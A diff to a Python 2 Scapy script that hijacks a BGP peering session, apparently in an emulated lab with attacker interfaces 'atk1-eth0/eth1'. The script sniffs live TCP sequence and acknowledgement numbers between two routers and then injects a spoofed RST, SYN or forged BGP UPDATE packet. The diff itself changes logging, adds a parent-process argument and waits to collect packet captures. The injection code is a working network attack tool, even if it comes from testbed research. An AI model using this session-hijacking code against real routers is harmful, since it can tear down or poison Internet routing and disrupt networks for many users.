@@ -4,24 +4,23 @@ import termcolor as T # grey red green yellow blue magenta cyan white
 import os
 import sys
 import ctypes
+import signal
 
 from subprocess import Popen, PIPE
 from scapy.all import *
 from random import randint
+from utils import log, log2
 
 load_contrib("bgp")
 
 
 SOURCE_ADDRESS = '9.0.1.2'
 DESTINATION_ADDRESS = '9.0.1.1'
-
-
-def log(s, col="green"):
-	print T.colored(s, col)
+SYN_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
 
 
 def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
-	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
+	log('Sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
 
 	tcp = TCP(flags="RA")
 	tcp.sport=int(srcPort)
@@ -40,7 +39,7 @@ def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNu
 
 
 def send_syn_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
-	log('sending SYN packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
+	log('Sending SYN packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
 
 	# swapping ports
 	srcPort, dstPort = dstPort, srcPort
@@ -195,6 +194,7 @@ def retrieve_ports_and_numbers(iface, srcIP, dstIP):
 
 def main():
 	choice = int(sys.argv[1])
+	parent_pid = int(sys.argv[2])
 	assert choice >= 1
 	assert choice <= 3
 
@@ -209,6 +209,8 @@ def main():
 	print 'R2 destination MAC address', dst_mac_address
 	print
 
+	sys.stdout.flush()
+
 	srcPort, dstPort, seqNum, ackNum, win = retrieve_ports_and_numbers('atk1-eth1', SOURCE_ADDRESS, DESTINATION_ADDRESS)
 	assert srcPort is not None
 	assert dstPort is not None
@@ -222,6 +224,8 @@ def main():
 	print 'window', win
 	print
 
+	sys.stdout.flush()
+
 	iface = 'atk1-eth0'
 
 	if choice == 1:
@@ -230,6 +234,14 @@ def main():
 		send_syn_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
 	else:
 		send_update_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+
+	sys.stdout.flush()
+
+	# keeping capturing packets
+	log2('packets collection', SYN_ATTACK_COLLECT_TIME, 'red')
+
+	log('Packets collected', 'red')
+	log('Check pcap capture files', 'red')
 
 
 if __name__ == "__main__":
